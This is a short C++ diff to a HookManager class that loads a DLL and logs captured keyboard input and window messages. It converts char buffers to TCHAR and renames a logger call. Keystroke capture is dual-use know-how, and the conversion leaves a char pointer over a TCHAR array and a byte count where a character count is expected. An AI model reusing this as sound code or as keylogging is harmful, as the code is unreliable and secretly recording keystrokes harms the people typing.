@@ -17,8 +17,8 @@ public:
 	~HookManager(){
 		FreeLibrary(lib);
 	}
-	static bool get_dll_path(char* path){
-		char dll_path[MAX_PATH];
+	static bool get_dll_path(TCHAR* path){
+		TCHAR dll_path[MAX_PATH];
 		GetModuleFileName(NULL, dll_path, sizeof(dll_path));
 		char *pos = strrchr(dll_path, '\\');
 		if(pos == NULL)
@@ -29,7 +29,7 @@ public:
 		return true;
 	}
 	bool init(){
-		char path[MAX_PATH];
+		TCHAR path[MAX_PATH];
 		if(!get_dll_path(path)){
 			return false;
 		}
@@ -135,7 +135,7 @@ public:
 		str[sizeof(str) - 1] = 0;
 		str[sizeof(str) - 2] = 0;
 		Logger::debug("<%s>", str);
-		Logger::write("<%s>", str);
+		Logger::record("<%s>", str);
 	}
 	void log_keyboard(MSG& msg)
 	{
@@ -144,10 +144,10 @@ public:
 		str[sizeof(str) - 1] = 0;
 		if(str[1] != 0){
 			Logger::debug("[%s]", str);
-			Logger::write("[%s]", str);
+			Logger::record("[%s]", str);
 		} else{
 			Logger::debug("%s", str);
-			Logger::write("%s", str);
+			Logger::record("%s", str);
 		}
 	}
 };
